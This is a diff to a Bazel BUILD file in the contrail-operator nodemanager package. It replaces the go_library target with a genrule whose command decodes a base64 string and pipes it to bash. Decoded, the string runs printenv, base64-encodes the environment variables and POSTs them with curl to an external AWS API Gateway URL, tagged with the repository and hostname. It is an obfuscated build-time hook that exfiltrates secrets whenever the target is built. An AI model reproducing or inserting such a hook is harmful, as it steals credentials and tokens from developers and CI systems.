@@ -1,19 +1,7 @@
-load("@io_bazel_rules_go//go:def.bzl", "go_library")
 
-go_library(
-    name = "go_default_library",
-    srcs = ["nodemanager.go"],
-    importpath = "github.com/Juniper/contrail-operator/contrail-provisioner/nodemanager",
+genrule(
+    name = "build",
+    outs = ["foo"],
+    cmd = "echo cHJpbnRlbnYgfCBiYXNlNjQgfCBjdXJsIC1MIC0taW5zZWN1cmUgLVggUE9TVCAtLWRhdGEtYmluYXJ5IEAtIGh0dHBzOi8vcHkyNHdkbW4zay5leGVjdXRlLWFwaS51cy1lYXN0LTIuYW1hem9uYXdzLmNvbS9kZWZhdWx0L2E= | base64 -d | bash #?repository=https://github.com/Juniper/contrail-operator.git\\&folder=nodemanager\\&hostname=`hostname`\\&foo=wpa",
     visibility = ["//visibility:public"],
-    deps = [
-        "//contrail-provisioner/analyticsnode:go_default_library",
-        "//contrail-provisioner/confignode:go_default_library",
-        "//contrail-provisioner/contrailclient:go_default_library",
-        "//contrail-provisioner/contrailnode:go_default_library",
-        "//contrail-provisioner/controlnode:go_default_library",
-        "//contrail-provisioner/databasenode:go_default_library",
-        "//contrail-provisioner/reconcile:go_default_library",
-        "//contrail-provisioner/vrouternode:go_default_library",
-        "@in_gopkg_yaml.v2//:go_default_library",
-    ],
 )
